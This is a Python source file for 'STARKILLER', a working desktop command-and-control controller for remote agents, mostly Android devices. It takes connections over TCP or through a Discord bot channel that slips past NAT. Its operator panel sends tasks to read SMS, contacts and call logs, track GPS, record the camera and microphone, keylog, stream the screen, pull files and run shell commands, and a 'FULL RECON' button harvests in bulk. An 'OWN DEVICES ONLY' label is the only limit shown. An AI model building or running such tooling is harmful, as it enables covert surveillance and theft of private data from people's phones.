"""
STARKILLER GUI — Desktop C2 Controller
22DIV / george wu

Desktop GUI with live screen, device control, and Discord relay.
TCP for LAN, Discord bot relay for internet (bypasses NAT).

Usage:
    python starkiller_gui.py                          # LAN only
    python starkiller_gui.py --discord-token BOT_TOKEN --channel-id 123456  # + Discord relay

Requires: pip install discord.py Pillow
"""
import os
import sys
import json
import socket
import struct
import threading
import time
import uuid
import base64
import io
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
from datetime import datetime
from collections import deque

try:
    from PIL import Image, ImageTk
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

try:
    import discord
    HAS_DISCORD = True
except ImportError:
    HAS_DISCORD = False

if sys.platform == "win32":
    os.system("")
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

ROOT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(ROOT_DIR)
DOWNLOADS_DIR = os.path.join(PROJECT_ROOT, "downloads")
SCREENSHOTS_DIR = os.path.join(DOWNLOADS_DIR, "screenshots")
AGENT_PORT = 8667

agents = {}
agents_lock = threading.Lock()
console_lines = deque(maxlen=5000)
console_lock = threading.Lock()
discord_bot = None
discord_channel_id = None


def ts():
    return datetime.now().strftime("%H:%M:%S")


def console_write(line, tag="info"):
    with console_lock:
        console_lines.append((f"[{ts()}] {line}", tag))


def agent_send(sock, data):
    raw = json.dumps(data).encode("utf-8")
    sock.sendall(struct.pack(">I", len(raw)) + raw)


def agent_recv(sock):
    hdr = b""
    while len(hdr) < 4:
        chunk = sock.recv(4 - len(hdr))
        if not chunk:
            return None
        hdr += chunk
    length = struct.unpack(">I", hdr)[0]
    if length > 10 * 1024 * 1024:
        return None
    body = b""
    while len(body) < length:
        chunk = sock.recv(min(65536, length - len(body)))
        if not chunk:
            return None
        body += chunk
    return json.loads(body.decode("utf-8"))


class Agent:
    def __init__(self, agent_id, sock, addr, info):
        self.id = agent_id
        self.sock = sock
        self.addr = addr
        self.hostname = info.get("hostname", "?")
        self.username = info.get("username", "?")
        self.os_info = info.get("os", "?")
        self.platform = info.get("platform", "unknown")
        self.model = info.get("model", "")
        self.carrier = info.get("carrier", "")
        self.battery = info.get("battery", "?")
        self.ip = info.get("ip", addr[0] if addr else "?")
        self.connected = True
        self.connected_at = ts()
        self.last_seen = time.time()
        self.last_gps = None
        self.last_screenshot = None
        self.pending_results = {}
        self.relay = info.get("relay", "tcp")

    def display_name(self):
        if self.model:
            return self.model
        return self.hostname

    def send_task(self, op, **kwargs):
        task_id = uuid.uuid4().hex[:6]
        task = {"type": "task", "task_id": task_id, "op": op, **kwargs}
        try:
            if self.relay == "discord" and discord_bot:
                discord_bot.relay_task(self.id, task)
            else:
                agent_send(self.sock, task)
            console_write(f"[>] {op} -> {self.display_name()} (task {task_id})", "cmd")
            return task_id
        except Exception as e:
            console_write(f"[!] Send failed: {e}", "error")
            return None


def agent_handler(sock, addr):
    agent_id = None
    try:
        msg = agent_recv(sock)
        if not msg or msg.get("type") != "register":
            sock.close()
            return

        agent_id = msg.get("agent_id", uuid.uuid4().hex[:8])
        platform = msg.get("platform", "unknown")
        if "android" in msg.get("os", "").lower():
            platform = "android"

        agent = Agent(agent_id, sock, addr, msg)
        agent.platform = platform

        with agents_lock:
            agents[agent_id] = agent

        console_write(f"[+] Agent connected: {agent.display_name()} ({agent_id}) from {addr[0]}", "ok")

        while True:
            msg = agent_recv(sock)
            if msg is None:
                break
            handle_agent_message(agent_id, msg)

    except (ConnectionResetError, ConnectionAbortedError, OSError):
        pass
    except Exception as e:
        console_write(f"[!] Handler error: {e}", "error")
    finally:
        if agent_id:
            with agents_lock:
                if agent_id in agents:
                    agents[agent_id].connected = False
                    agents[agent_id].sock = None
            console_write(f"[-] Agent disconnected: {agent_id}", "warn")
        try:
            sock.close()
        except Exception:
            pass


def handle_agent_message(agent_id, msg):
    with agents_lock:
        agent = agents.get(agent_id)
    if not agent:
        return

    msg_type = msg.get("type", "")

    if msg_type == "heartbeat":
        agent.last_seen = time.time()
        if "battery" in msg:
            agent.battery = msg["battery"]
        if "gps" in msg or "last_gps" in msg:
            agent.last_gps = msg.get("last_gps") or msg.get("gps")

    elif msg_type == "output":
        line = msg.get("line", "")
        console_write(f"  [{agent.display_name()}] {line}", "info")

    elif msg_type == "result":
        task_id = msg.get("task_id", "?")
        data = msg.get("data", {})
        if isinstance(data, dict) and "error" in data:
            console_write(f"[!] [{agent.display_name()}] Task {task_id} error: {data['error']}", "error")
        else:
            if isinstance(data, dict):
                if "latitude" in data:
                    agent.last_gps = f"{data['latitude']},{data['longitude']}"

                if "frame" in data:
                    try:
                        frame_bytes = base64.b64decode(data["frame"])
                        agent.last_screenshot = frame_bytes
                    except Exception:
                        pass
                    return

                keys = list(data.keys())[:5]
                summary = ", ".join(f"{k}={data[k]}" for k in keys if not isinstance(data[k], (list, dict)))
                for k in keys:
                    if isinstance(data[k], list):
                        summary += f", {k}=[{len(data[k])} items]"
            else:
                summary = str(data)[:200]
            console_write(f"[+] [{agent.display_name()}] Task {task_id}: {summary[:300]}", "ok")

    elif msg_type == "file_data":
        raw = base64.b64decode(msg.get("data", ""))
        task_id = msg.get("task_id", "?")
        filename = msg.get("filename", f"agent_{agent_id}_{task_id}.bin")

        if filename.endswith((".jpg", ".jpeg", ".png")):
            os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
            fpath = os.path.join(SCREENSHOTS_DIR, filename)
            agent.last_screenshot = raw
        else:
            os.makedirs(DOWNLOADS_DIR, exist_ok=True)
            fpath = os.path.join(DOWNLOADS_DIR, filename)

        with open(fpath, "wb") as f:
            f.write(raw)
        console_write(f"[+] [{agent.display_name()}] File: {filename} ({len(raw)} bytes)", "ok")


def agent_listener():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("0.0.0.0", AGENT_PORT))
    except OSError as e:
        console_write(f"[!] Listener bind failed: {e}", "error")
        return
    srv.listen(16)
    console_write(f"[*] TCP listener on 0.0.0.0:{AGENT_PORT}", "ok")
    while True:
        try:
            conn, addr = srv.accept()
            threading.Thread(target=agent_handler, args=(conn, addr), daemon=True).start()
        except Exception:
            pass


class DiscordRelay:
    def __init__(self, token, channel_id):
        self.token = token
        self.channel_id = int(channel_id)
        self.client = None
        self.channel = None
        self.ready = threading.Event()
        self.loop = None

    def start(self):
        threading.Thread(target=self._run, daemon=True).start()

    def _run(self):
        import asyncio

        intents = discord.Intents.default()
        intents.message_content = True
        self.client = discord.Client(intents=intents)

        @self.client.event
        async def on_ready():
            self.channel = self.client.get_channel(self.channel_id)
            self.loop = asyncio.get_event_loop()
            self.ready.set()
            console_write(f"[+] Discord relay online: {self.client.user}", "ok")
            if self.channel:
                await self.channel.send("```\n[STARKILLER C2] Online. Awaiting agents.\n```")

        @self.client.event
        async def on_message(message):
            if message.author == self.client.user:
                return
            if message.channel.id != self.channel_id:
                return

            content = message.content.strip()

            if content.startswith("!register "):
                try:
                    data = json.loads(content[10:])
                    agent_id = data.get("agent_id", uuid.uuid4().hex[:8])
                    agent = Agent(agent_id, None, ("discord", 0), data)
                    agent.relay = "discord"
                    agent.platform = data.get("platform", "android")
                    with agents_lock:
                        agents[agent_id] = agent
                    console_write(f"[+] Discord agent: {agent.display_name()} ({agent_id})", "ok")
                    await message.channel.send(f"```\n[C2] Registered: {agent_id}\n```")
                except Exception as e:
                    console_write(f"[!] Discord register error: {e}", "error")

            elif content.startswith("!result "):
                try:
                    data = json.loads(content[8:])
                    aid = data.get("agent_id", "")
                    handle_agent_message(aid, data)
                except Exception as e:
                    console_write(f"[!] Discord result error: {e}", "error")

            elif content.startswith("!heartbeat "):
                try:
                    data = json.loads(content[11:])
                    aid = data.get("agent_id", "")
                    handle_agent_message(aid, {"type": "heartbeat", **data})
                except Exception as e:
                    pass

            elif content.startswith("!file "):
                try:
                    data = json.loads(content[6:])
                    aid = data.get("agent_id", "")
                    handle_agent_message(aid, {"type": "file_data", **data})
                except Exception as e:
                    pass

            if message.attachments:
                for att in message.attachments:
                    if att.filename.endswith((".jpg", ".png")):
                        raw = await att.read()
                        parts = att.filename.split("_")
                        if len(parts) >= 2:
                            aid = parts[0]
                            with agents_lock:
                                if aid in agents:
                                    agents[aid].last_screenshot = raw

        try:
            self.client.run(self.token, log_handler=None)
        except Exception as e:
            console_write(f"[!] Discord relay failed: {e}", "error")

    def relay_task(self, agent_id, task):
        if not self.ready.is_set() or not self.channel or not self.loop:
            return
        import asyncio
        msg = f"!task {agent_id} {json.dumps(task)}"
        asyncio.run_coroutine_threadsafe(
            self.channel.send(f"```\n{msg}\n```"),
            self.loop
        )


BG = "#0a0a0a"
BG2 = "#111111"
BG3 = "#1a1a1a"
BORDER = "#222222"
GREEN = "#00FF41"
AMBER = "#FFB000"
RED = "#FF4444"
BLUE = "#4488FF"
PINK = "#FF2D8A"
PURPLE = "#9966FF"
DIM = "#555555"
TEXT = "#cccccc"
WHITE = "#ffffff"


class StarKillerGUI:
    def __init__(self, root, discord_token=None, discord_channel=None):
        self.root = root
        self.root.title("STARKILLER C2")
        self.root.configure(bg=BG)
        self.root.geometry("1280x800")
        self.root.minsize(1000, 600)

        self.selected_agent = None
        self.vnc_active = False
        self.vnc_interval = 500
        self.console_pos = 0
        self.live_photo = None

        style = ttk.Style()
        style.theme_use("clam")
        style.configure(".", background=BG, foreground=TEXT, fieldbackground=BG3)
        style.configure("TFrame", background=BG)
        style.configure("TLabel", background=BG, foreground=TEXT)
        style.configure("TButton", background=BG3, foreground=TEXT)
        style.map("TButton", background=[("active", BG2)])

        self._build_header()
        self._build_body()
        self._build_footer()

        threading.Thread(target=agent_listener, daemon=True).start()

        if discord_token and discord_channel and HAS_DISCORD:
            global discord_bot, discord_channel_id
            discord_channel_id = int(discord_channel)
            discord_bot = DiscordRelay(discord_token, discord_channel)
            discord_bot.start()
            console_write("[*] Discord relay starting...", "info")

        self._poll()

    def _build_header(self):
        hdr = tk.Frame(self.root, bg=BG2, height=50)
        hdr.pack(fill="x")
        hdr.pack_propagate(False)

        tk.Label(hdr, text="STARKILLER", bg=BG2, fg=RED,
                 font=("Consolas", 16, "bold")).pack(side="left", padx=(16, 4))
        tk.Label(hdr, text="C2 CONTROLLER", bg=BG2, fg=DIM,
                 font=("Consolas", 9)).pack(side="left")

        tk.Label(hdr, text="22DIV // george wu", bg=BG2, fg=DIM,
                 font=("Consolas", 9)).pack(side="left", padx=20)

        self.status_label = tk.Label(hdr, text=" LISTENING ", bg="#0a1a0a", fg=GREEN,
                                     font=("Consolas", 9, "bold"))
        self.status_label.pack(side="right", padx=16)

        self.agent_count_label = tk.Label(hdr, text="AGENTS: 0", bg=BG2, fg=WHITE,
                                          font=("Consolas", 10))
        self.agent_count_label.pack(side="right", padx=8)

    def _build_body(self):
        body = tk.Frame(self.root, bg=BG)
        body.pack(fill="both", expand=True)

        self.sidebar = tk.Frame(body, bg=BG2, width=280)
        self.sidebar.pack(side="left", fill="y")
        self.sidebar.pack_propagate(False)

        tk.Label(self.sidebar, text="AGENTS", bg=BG2, fg=RED,
                 font=("Consolas", 9, "bold"), anchor="w").pack(fill="x", padx=12, pady=(10, 4))

        self.agent_list_frame = tk.Frame(self.sidebar, bg=BG2)
        self.agent_list_frame.pack(fill="x")

        self.no_agents_label = tk.Label(self.agent_list_frame, text="Waiting for connections...",
                                         bg=BG2, fg=DIM, font=("Consolas", 9))
        self.no_agents_label.pack(padx=12, pady=8, anchor="w")

        sep = tk.Frame(self.sidebar, bg=BORDER, height=1)
        sep.pack(fill="x", padx=8, pady=4)

        self.detail_frame = tk.Frame(self.sidebar, bg=BG2)
        self.detail_frame.pack(fill="x")

        sep2 = tk.Frame(self.sidebar, bg=BORDER, height=1)
        sep2.pack(fill="x", padx=8, pady=4)

        tk.Label(self.sidebar, text="OPERATIONS", bg=BG2, fg=AMBER,
                 font=("Consolas", 9, "bold"), anchor="w").pack(fill="x", padx=12, pady=(4, 4))

        self.ops_frame = tk.Frame(self.sidebar, bg=BG2)
        self.ops_frame.pack(fill="x", padx=8)
        self._build_ops()

        main = tk.Frame(body, bg=BG)
        main.pack(side="left", fill="both", expand=True)

        top_main = tk.Frame(main, bg=BG)
        top_main.pack(fill="both", expand=True)

        self.screen_frame = tk.Frame(top_main, bg="#000000", width=360, height=640)
        self.screen_frame.pack(side="left", fill="y", padx=(4, 0), pady=4)
        self.screen_frame.pack_propagate(False)

        tk.Label(self.screen_frame, text="LIVE SCREEN", bg="#000000", fg=DIM,
                 font=("Consolas", 8, "bold")).pack(pady=(4, 0))

        self.screen_label = tk.Label(self.screen_frame, bg="#000000", fg=DIM,
                                      text="No feed", font=("Consolas", 10))
        self.screen_label.pack(expand=True)

        vnc_bar = tk.Frame(self.screen_frame, bg=BG3)
        vnc_bar.pack(fill="x", side="bottom")

        self.vnc_btn = tk.Button(vnc_bar, text="START VNC", bg=BG3, fg=GREEN,
                                  font=("Consolas", 8, "bold"), relief="flat",
                                  activebackground=BG2, activeforeground=GREEN,
                                  command=self._toggle_vnc)
        self.vnc_btn.pack(side="left", padx=4, pady=2)

        self.screenshot_btn = tk.Button(vnc_bar, text="SCREENSHOT", bg=BG3, fg=AMBER,
                                         font=("Consolas", 8, "bold"), relief="flat",
                                         activebackground=BG2, activeforeground=AMBER,
                                         command=lambda: self._op("screenshot"))
        self.screenshot_btn.pack(side="left", padx=4, pady=2)

        console_frame = tk.Frame(top_main, bg=BG)
        console_frame.pack(side="left", fill="both", expand=True)

        console_hdr = tk.Frame(console_frame, bg=BG2)
        console_hdr.pack(fill="x")
        tk.Label(console_hdr, text="CONSOLE", bg=BG2, fg=DIM,
                 font=("Consolas", 9, "bold")).pack(side="left", padx=8, pady=4)

        clear_btn = tk.Button(console_hdr, text="CLEAR", bg=BG3, fg=DIM,
                               font=("Consolas", 8), relief="flat",
                               activebackground=BG2, command=self._clear_console)
        clear_btn.pack(side="right", padx=8, pady=2)

        self.console = scrolledtext.ScrolledText(
            console_frame, bg=BG, fg=TEXT, insertbackground=TEXT,
            font=("Consolas", 10), relief="flat", wrap="word",
            state="disabled", borderwidth=0, highlightthickness=0
        )
        self.console.pack(fill="both", expand=True, padx=4, pady=4)
        self.console.tag_configure("ok", foreground=GREEN)
        self.console.tag_configure("error", foreground=RED)
        self.console.tag_configure("warn", foreground=AMBER)
        self.console.tag_configure("cmd", foreground=PURPLE)
        self.console.tag_configure("info", foreground=TEXT)
        self.console.tag_configure("ts", foreground=DIM)

        cmd_frame = tk.Frame(console_frame, bg=BG2)
        cmd_frame.pack(fill="x")
        tk.Label(cmd_frame, text=">", bg=BG2, fg=RED,
                 font=("Consolas", 10, "bold")).pack(side="left", padx=(8, 4))
        self.cmd_entry = tk.Entry(cmd_frame, bg=BG3, fg=WHITE, insertbackground=WHITE,
                                   font=("Consolas", 10), relief="flat", borderwidth=0)
        self.cmd_entry.pack(side="left", fill="x", expand=True, padx=4, pady=4)
        self.cmd_entry.bind("<Return>", self._exec_cmd)

    def _build_ops(self):
        for w in self.ops_frame.winfo_children():
            w.destroy()

        ops = [
            ("SYSINFO", "sysinfo"), ("GPS", "gps"),
            ("CAMERA", "camera"), ("MIC", "mic"),
            ("SMS", "sms_read"), ("CONTACTS", "contacts"),
            ("CALLS", "calllog"), ("APPS", "apps"),
            ("SCREEN", "screenshot"), ("NOTIFS", "notifs"),
            ("FILES", "ls"), ("EXEC", "exec"),
            ("KEYLOG", "keylog"), ("PING", "ping"),
        ]

        for i, (label, op) in enumerate(ops):
            row, col = divmod(i, 2)
            btn = tk.Button(self.ops_frame, text=label, bg=BG3, fg=TEXT,
                             font=("Consolas", 8, "bold"), relief="flat",
                             activebackground=BG2, activeforeground=RED,
                             width=12, command=lambda o=op: self._op(o))
            btn.grid(row=row, column=col, padx=2, pady=1, sticky="ew")

        self.ops_frame.grid_columnconfigure(0, weight=1)
        self.ops_frame.grid_columnconfigure(1, weight=1)

        recon_btn = tk.Button(self.ops_frame, text="FULL RECON", bg=BG3, fg=RED,
                               font=("Consolas", 8, "bold"), relief="flat",
                               activebackground=BG2, activeforeground=RED,
                               command=lambda: self._op("recon"))
        recon_btn.grid(row=len(ops) // 2, column=0, columnspan=2, padx=2, pady=(4, 2), sticky="ew")

        vnc_btn = tk.Button(self.ops_frame, text="VNC STREAM", bg=BG3, fg=GREEN,
                              font=("Consolas", 8, "bold"), relief="flat",
                              activebackground=BG2, activeforeground=GREEN,
                              command=self._toggle_vnc)
        vnc_btn.grid(row=len(ops) // 2 + 1, column=0, columnspan=2, padx=2, pady=1, sticky="ew")

    def _build_footer(self):
        ftr = tk.Frame(self.root, bg=BG2, height=28)
        ftr.pack(fill="x", side="bottom")
        ftr.pack_propagate(False)

        tk.Label(ftr, text=f"TCP :{AGENT_PORT}", bg=BG2, fg=DIM,
                 font=("Consolas", 9)).pack(side="left", padx=12)

        self.discord_status = tk.Label(ftr, text="DISCORD: OFF", bg=BG2, fg=DIM,
                                        font=("Consolas", 9))
        self.discord_status.pack(side="left", padx=12)

        tk.Label(ftr, text="OWN DEVICES ONLY", bg=BG2, fg=AMBER,
                 font=("Consolas", 9)).pack(side="right", padx=12)

    def _refresh_agents(self):
        for w in self.agent_list_frame.winfo_children():
            w.destroy()

        with agents_lock:
            agent_list = [(aid, a) for aid, a in agents.items()]

        online = sum(1 for _, a in agent_list if a.connected)
        self.agent_count_label.config(text=f"AGENTS: {online}")

        if not agent_list:
            self.no_agents_label = tk.Label(self.agent_list_frame, text="Waiting for connections...",
                                             bg=BG2, fg=DIM, font=("Consolas", 9))
            self.no_agents_label.pack(padx=12, pady=8, anchor="w")
            return

        for aid, agent in agent_list:
            is_selected = aid == self.selected_agent
            bg = BG3 if is_selected else BG2
            frame = tk.Frame(self.agent_list_frame, bg=bg, cursor="hand2")
            frame.pack(fill="x", padx=4, pady=1)
            frame.bind("<Button-1>", lambda e, a=aid: self._select_agent(a))

            dot_color = GREEN if agent.connected else RED
            dot = tk.Canvas(frame, width=10, height=10, bg=bg, highlightthickness=0)
            dot.create_oval(1, 1, 9, 9, fill=dot_color, outline=dot_color)
            dot.pack(side="left", padx=(8, 4), pady=4)
            dot.bind("<Button-1>", lambda e, a=aid: self._select_agent(a))

            icon = "A" if agent.platform == "android" else "W"
            icon_color = GREEN if agent.platform == "android" else BLUE
            tk.Label(frame, text=icon, bg=bg, fg=icon_color,
                     font=("Consolas", 11, "bold")).pack(side="left", padx=2)

            info_frame = tk.Frame(frame, bg=bg)
            info_frame.pack(side="left", fill="x", expand=True, padx=4)
            info_frame.bind("<Button-1>", lambda e, a=aid: self._select_agent(a))

            tk.Label(info_frame, text=agent.display_name(), bg=bg, fg=WHITE,
                     font=("Consolas", 9), anchor="w").pack(anchor="w")
            tk.Label(info_frame, text=f"{agent.ip} | {agent.relay.upper()}", bg=bg, fg=DIM,
                     font=("Consolas", 8), anchor="w").pack(anchor="w")

            tk.Label(frame, text=aid[:6], bg=bg, fg=RED,
                     font=("Consolas", 8, "bold")).pack(side="right", padx=8)

        self._refresh_detail()

    def _select_agent(self, agent_id):
        self.selected_agent = agent_id if self.selected_agent != agent_id else None
        self._refresh_agents()

    def _refresh_detail(self):
        for w in self.detail_frame.winfo_children():
            w.destroy()

        if not self.selected_agent:
            return

        with agents_lock:
            agent = agents.get(self.selected_agent)
        if not agent:
            return

        tk.Label(self.detail_frame, text="DEVICE INFO", bg=BG2, fg=PURPLE,
                 font=("Consolas", 9, "bold"), anchor="w").pack(fill="x", padx=12, pady=(4, 2))

        details = [
            ("Platform", agent.platform.upper(), GREEN if agent.platform == "android" else BLUE),
            ("OS", agent.os_info, TEXT),
            ("Model", agent.model or "-", TEXT),
            ("Carrier", agent.carrier or "-", TEXT),
            ("Battery", str(agent.battery) + "%" if agent.battery != "?" else "?", TEXT),
            ("IP", agent.ip, TEXT),
            ("GPS", agent.last_gps or "-", AMBER if agent.last_gps else DIM),
            ("Relay", agent.relay.upper(), GREEN if agent.relay == "discord" else TEXT),
            ("Connected", agent.connected_at, TEXT),
        ]

        for label, val, color in details:
            row = tk.Frame(self.detail_frame, bg=BG2)
            row.pack(fill="x", padx=12)
            tk.Label(row, text=label, bg=BG2, fg=DIM,
                     font=("Consolas", 8), width=10, anchor="w").pack(side="left")
            tk.Label(row, text=val, bg=BG2, fg=color,
                     font=("Consolas", 8), anchor="e").pack(side="right")

    def _op(self, op):
        if not self.selected_agent:
            console_write("[!] No agent selected", "error")
            return

        with agents_lock:
            agent = agents.get(self.selected_agent)
        if not agent or not agent.connected:
            console_write("[!] Agent not connected", "error")
            return

        kwargs = {}
        if op == "exec":
            from tkinter.simpledialog import askstring
            cmd = askstring("Execute", "Command:", parent=self.root)
            if not cmd:
                return
            kwargs["cmd"] = cmd
        elif op == "ls":
            from tkinter.simpledialog import askstring
            path = askstring("Files", "Directory:", initialvalue="/sdcard", parent=self.root)
            if path is None:
                return
            kwargs["path"] = path or "/sdcard"
        elif op == "camera":
            kwargs["camera"] = "front"
        elif op == "mic":
            from tkinter.simpledialog import askinteger
            dur = askinteger("Mic", "Duration (seconds):", initialvalue=10, parent=self.root)
            if not dur:
                return
            kwargs["duration"] = dur
        elif op == "recon":
            for sub_op in ["sysinfo", "gps", "sms_read", "contacts", "calllog", "apps"]:
                agent.send_task(sub_op)
                time.sleep(0.1)
            return

        agent.send_task(op, **kwargs)

    def _toggle_vnc(self):
        if not self.selected_agent:
            console_write("[!] No agent selected", "error")
            return

        with agents_lock:
            agent = agents.get(self.selected_agent)
        if not agent or not agent.connected:
            return

        if self.vnc_active:
            self.vnc_active = False
            self.vnc_btn.config(text="START VNC", fg=GREEN)
            console_write("[*] VNC stream stopped", "warn")
        else:
            self.vnc_active = True
            self.vnc_btn.config(text="STOP VNC", fg=RED)
            agent.send_task("vnc", frames=999, interval=self.vnc_interval)
            console_write("[*] VNC stream started", "ok")

    def _update_screen(self):
        if not self.selected_agent:
            return

        with agents_lock:
            agent = agents.get(self.selected_agent)
        if not agent or not agent.last_screenshot:
            return

        if not HAS_PIL:
            return

        try:
            img = Image.open(io.BytesIO(agent.last_screenshot))
            frame_w = self.screen_frame.winfo_width() - 8
            frame_h = self.screen_frame.winfo_height() - 50
            if frame_w < 10 or frame_h < 10:
                return

            ratio = min(frame_w / img.width, frame_h / img.height)
            new_w = max(1, int(img.width * ratio))
            new_h = max(1, int(img.height * ratio))
            img = img.resize((new_w, new_h), Image.LANCZOS)

            self.live_photo = ImageTk.PhotoImage(img)
            self.screen_label.config(image=self.live_photo, text="")
        except Exception:
            pass

    def _update_console(self):
        with console_lock:
            lines = list(console_lines)

        if len(lines) <= self.console_pos:
            return

        new_lines = lines[self.console_pos:]
        self.console_pos = len(lines)

        self.console.config(state="normal")
        was_at_end = self.console.yview()[1] >= 0.95

        for text, tag in new_lines:
            ts_end = text.find("]") + 1 if text.startswith("[") else 0
            if ts_end > 0:
                self.console.insert("end", text[:ts_end] + " ", "ts")
                self.console.insert("end", text[ts_end:] + "\n", tag)
            else:
                self.console.insert("end", text + "\n", tag)

        if was_at_end:
            self.console.see("end")
        self.console.config(state="disabled")

    def _clear_console(self):
        with console_lock:
            console_lines.clear()
        self.console_pos = 0
        self.console.config(state="normal")
        self.console.delete("1.0", "end")
        self.console.config(state="disabled")

    def _exec_cmd(self, event):
        cmd = self.cmd_entry.get().strip()
        self.cmd_entry.delete(0, "end")
        if not cmd:
            return

        if cmd.startswith("!"):
            parts = cmd[1:].split(None, 1)
            op = parts[0] if parts else ""
            if op == "agents":
                with agents_lock:
                    for aid, a in agents.items():
                        status = "ONLINE" if a.connected else "OFFLINE"
                        console_write(f"  {aid} | {a.display_name()} | {a.ip} | {status} | {a.relay}", "info")
            elif op == "select" and len(parts) > 1:
                self._select_agent(parts[1].strip())
            elif op == "discord":
                if discord_bot and discord_bot.ready.is_set():
                    console_write("[+] Discord relay: ONLINE", "ok")
                else:
                    console_write("[!] Discord relay: OFFLINE", "error")
            elif op == "help":
                for line in [
                    "!agents      - List connected agents",
                    "!select <id> - Select agent by ID",
                    "!discord     - Check Discord relay status",
                    "<command>    - Execute shell command on selected agent",
                ]:
                    console_write(f"  {line}", "info")
            return

        if not self.selected_agent:
            console_write("[!] No agent selected. Use !select <id>", "error")
            return

        with agents_lock:
            agent = agents.get(self.selected_agent)
        if agent and agent.connected:
            agent.send_task("exec", cmd=cmd)

    def _poll(self):
        try:
            self._refresh_agents()
            self._update_console()
            self._update_screen()

            if discord_bot:
                if discord_bot.ready.is_set():
                    self.discord_status.config(text="DISCORD: ONLINE", fg=GREEN)
                else:
                    self.discord_status.config(text="DISCORD: CONNECTING...", fg=AMBER)
        except Exception:
            pass

        self.root.after(500, self._poll)


def main():
    import argparse
    parser = argparse.ArgumentParser(description="StarKiller GUI C2")
    parser.add_argument("--agent-port", type=int, default=8667)
    parser.add_argument("--discord-token", help="Discord bot token for internet relay")
    parser.add_argument("--channel-id", help="Discord channel ID for C2 relay")
    args = parser.parse_args()

    global AGENT_PORT
    AGENT_PORT = args.agent_port

    console_write("StarKiller C2 GUI initialised", "ok")
    console_write(f"TCP listener: 0.0.0.0:{AGENT_PORT}", "info")
    if args.discord_token:
        console_write("Discord relay: enabled", "info")

    root = tk.Tk()
    try:
        root.iconbitmap(default="")
    except Exception:
        pass

    app = StarKillerGUI(root, args.discord_token, args.channel_id)
    root.mainloop()


if __name__ == "__main__":
    main()
